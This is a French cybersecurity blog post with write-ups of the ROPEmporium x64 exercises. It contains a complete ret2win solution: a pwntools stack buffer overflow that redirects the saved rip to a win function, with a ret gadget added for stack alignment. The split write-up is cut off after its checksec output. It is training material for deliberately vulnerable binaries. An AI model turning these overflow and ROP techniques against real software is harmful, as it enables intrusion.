<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        üá´üá∑ ROPEmporium - x64 ::
        blog cybers√©curit√©
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Sommaire # Ex.1: ret2win # Exploitation Final Payload Ex.2: split # Exploitation Final Payload Ex.3: callme # Exploitation Final Payload Ex.4: write4 # Exploitation Final Payload Ex.5: badchars # Exploitation Final Payload ret2win # Note # Je suis actuellement entrain d&amp;rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&amp;rsquo;h√©sitez pas √† me contacter sur discord."
/>
<meta
  name="keywords"
  content="rami malek"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/ropemporium-x64/" />


<meta name="description" content="un blog sur lequel vous pourrez retrouver des writeups et des posts explicatifs en fran√ßais et en anglais">




<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="üá´üá∑ ROPEmporium - x64"/>
<meta name="twitter:description" content="write-ups pour chaque exercice de ropemporium.com en x64"/>



<meta property="og:title" content="üá´üá∑ ROPEmporium - x64" />
<meta property="og:description" content="write-ups pour chaque exercice de ropemporium.com en x64" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/ropemporium-x64/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-01-29T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-01-29T00:00:00+00:00" /><meta property="og:site_name" content="blog cybers√©curit√©" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">
            writeups
            <span class="menu__sub-inner-more-trigger-icon"
              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span
            >
          </li>
          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/htb-writeups/">HTB Writeups</a></li>
              
            
              
                <li><a href="/thm-writeups/">THM Writeups</a></li>
              
            
          </ul>
        </ul>
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
      
        <li><a href="/htb-writeups/">HTB Writeups</a></li>
      
    
      
        <li><a href="/thm-writeups/">THM Writeups</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">üá´üá∑ ROPEmporium - x64</h1>
    <div class="post-meta">
      
        <time class="post-date">
          29-01-2023
        </time>

        
          
        
      

      
        <span class="post-author"
          >‚Äî √©crit par conflict</span
        >


      
        <span class="post-read-time"
          >‚Äî 31 minute(s) de lecture</span
        >
      
    </div>

    

    
      <figure class="post-cover">
  
    <img src="/static/img/ropemporium_cover.png" alt="üá´üá∑ ROPEmporium - x64"/>
  

  
</figure>

    

    <div class="post-content">
      
      <h3 id="sommaire">
  Sommaire
  <a href="#sommaire" class="h-anchor" aria-hidden="true">#</a>
</h3>
<hr>
<ul>
<li>
<h4 id="ex1-ret2winret2win">
  Ex.1: <a href="#ret2win"><em>ret2win</em></a>
  <a href="#ex1-ret2winret2win" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ul>
<li><a href="#exploitation">Exploitation</a></li>
<li><a href="#final-payload">Final Payload</a></li>
</ul>
</li>
<li>
<h4 id="ex2-splitsplit">
  Ex.2: <a href="#split"><em>split</em></a>
  <a href="#ex2-splitsplit" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ul>
<li><a href="#exploitation-1">Exploitation</a></li>
<li><a href="#final-payload-1">Final Payload</a></li>
</ul>
</li>
<li>
<h4 id="ex3-callmecallme">
  Ex.3: <a href="#callme"><em>callme</em></a>
  <a href="#ex3-callmecallme" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ul>
<li><a href="#exploitation-2">Exploitation</a></li>
<li><a href="#final-payload-2">Final Payload</a></li>
</ul>
</li>
<li>
<h4 id="ex4-write4write4">
  Ex.4: <a href="#write4"><em>write4</em></a>
  <a href="#ex4-write4write4" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ul>
<li><a href="#exploitation-3">Exploitation</a></li>
<li><a href="#final-payload-3">Final Payload</a></li>
</ul>
</li>
<li>
<h4 id="ex5-badcharsbadchars">
  Ex.5: <a href="#badchars"><em>badchars</em></a>
  <a href="#ex5-badcharsbadchars" class="h-anchor" aria-hidden="true">#</a>
</h4>
<ul>
<li><a href="#exploitation-4">Exploitation</a></li>
<li><a href="#final-payload-4">Final Payload</a></li>
</ul>
</li>
</ul>
<hr>
<h1 id="ret2win">
  ret2win
  <a href="#ret2win" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h2 id="note">
  Note
  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Je suis actuellement entrain d&rsquo;apprendre le pwn donc il est possible que je fasse des erreurs ou que je dise des choses fausses dans ce post, si vous en voyez n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a>.</p>
<h2 id="file-information">
  File information
  <a href="#file-information" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>file ret2win
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret2win: ELF 64-bit LSB executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2win</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="exploitation">
  Exploitation
  <a href="#exploitation" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>On va le run et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438458-863bbd90-ce7f-4af6-bdd0-e56ac4a6ba7f.png" alt="2023-01-13-194951_1041x663_scrot"></p>
<p>En lisant ce que le programme √©crit on apprend plusieurs choses:</p>
<ul>
<li>La taille du buffer o√π est stock√© notre input: 32 bytes</li>
<li>La fonction read() est utilis√©e pour lire notre input</li>
<li>read() va lire 56 bytes au maximum</li>
</ul>
<p>On va pouvoir overflow le buffer puisqu&rsquo;on peut √©crire un nombre de bytes sup√©rieur √† la taille du buffer</p>
<p>Voici donc le d√©but de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span></code></pre></div><p>Ici, on d√©clare deux variables, une qui correspond au padding n√©cessaire pour remplir le buffer (padding), et une qui correspond au padding pour overwrite la sauvegarde de <code>rbp</code> (rbp)</p>
<p>On envoie ensuite notre payload mais en l&rsquo;occurence ici il ne va rien se passer puisque la sauvegarde de <code>rip</code> n&rsquo;a pas √©t√© overwrite.</p>
<p>La prochaine √©tape est de lister les symboles de l&rsquo;executable pour trouver notre fonction &ldquo;win&rdquo; (une fonction qui va nous permettre de lire le flag). Pour faire √ßa, on peut utiliser <code>pwndbg</code> par exemple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>	All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400756</span>  ret2win
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400780</span>  __libc_csu_init
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004007f0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x00000000004007f4</span>  _fini
</span></span></code></pre></div><p>Une fonction sort du lot: <code>ret2win</code> (situ√©e √† l&rsquo;adresse <code>0x0000000000400756</code>)</p>
<p>On va donc regarder ce qu&rsquo;elle fait plus en d√©tail, toujours avec <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass ret2win
</span></span><span style="display:flex;"><span>	Dump of assembler code <span style="color:#66d9ef">for</span> function ret2win:
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400756</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   rbp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400757</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>:	mov    rbp,rsp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040075a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400926</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040075f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400764</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	mov    edi,<span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400769</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040076e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">24</span><span style="color:#f92672">&gt;</span>:	nop
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x000000000040076f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:	pop    rbp
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x0000000000400770</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	ret    
</span></span><span style="display:flex;"><span>	End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Il y a 2 <code>call</code>, un sur <code>puts</code> et un sur <code>system</code>. On voit qu&rsquo;il passe un argument √† <code>system</code>, situ√© √† l&rsquo;adresse <code>0x400943</code></p>
<p>On va donc regarder ce qui se trouve √† cette adresse:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>	pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x400943</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x400943</span>:	<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>
</span></span></code></pre></div><p>Ok, donc c&rsquo;est effectivement notre fonction win, puisqu&rsquo;elle passe <code>&quot;/bin/cat flag.txt&quot;</code> en argument dans <code>system()</code>.</p>
<p>L&rsquo;id√©e va donc √™tre d&rsquo;ajouter l&rsquo;adresse de cette fonction √† la fin de notre payload, pour qu&rsquo;elle finisse dans la sauvegarde de <code>rip</code></p>
<blockquote>
<p>La sauvegarde de <code>rip</code> contient toujours l&rsquo;adresse de la prochaine instruction √† √©xecuter. Ici, en r√©ecrivant sa valeur actuelle par l&rsquo;adresse de la fonction <code>ret2win</code>, on modifie la prochaine √©tape du programme en lui faisant appeler une fonction qui ne devait jamais √™tre appel√©e. On a donc modifi√© son <strong>flux d&rsquo;√©xecution</strong>.</p>
</blockquote>
<p>On peut compl√©ter notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Maintenant, on lance l&rsquo;exploit et on devrait avoir le flag</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212438841-fe612582-a330-472b-ba9b-c9fa7f237d8f.png" alt="2023-01-13-201012_1135x146_scrot"></p>
<p>Et&hellip; le flag n&rsquo;a pas √©t√© print car le programme a <code>segfault</code>. Puisque je suis sous Ubuntu 22.04, qui est une version ult√©rieure √† la 18.04 je suis affect√© par les probl√®mes de <strong>stack alignment</strong> (MOVAPS)</p>
<p>Pour r√©gler √ßa, on peut ajouter un gadget <code>ret</code>, qu&rsquo;on va trouver en utilisant <code>ROPgadget</code>, apr√®s notre padding</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary ret2win <span style="color:#f92672">|</span> grep ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040053e</span> : ret
</span></span></code></pre></div><h2 id="final-payload">
  Final Payload
  <a href="#final-payload" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Maintenant qu&rsquo;on a l&rsquo;addresse du <code>ret</code> on peut l&rsquo;ajouter √† notre payload, et il devrait fonctionner cette fois. Voici donc la version finale de l&rsquo;exploit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ret2win&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400756</span>)
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040053e</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> rip
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/212439094-3d54ce77-a9d1-485a-afe7-f1ae7bd3dea2.png" alt="2023-01-13-201337_1023x371_scrot"></p>
<p>Et on a le flag, gg!</p>
<hr>
<h1 id="split">
  split
  <a href="#split" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h2 id="note-1">
  Note
  <a href="#note-1" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Deuxi√®me exercice de ROPEmporium, un tout petit peu plus complexe que le pr√©c√©dent mais il reste tr√®s accessible. Je vais essayer une fois de plus d&rsquo;expliquer le plus clairement possible ce que j&rsquo;ai fait pour le r√©ussir. Si j&rsquo;ai fait des erreurs, n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite √† regarder <a href="#ret2win">le premier exercice</a>.</p>
<h2 id="file-information-1">
  File information
  <a href="#file-information-1" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">split</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">split</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">98755e64e1d0c1bff48fccae1dca9ee9e3c609e2</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/split_x64/split&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
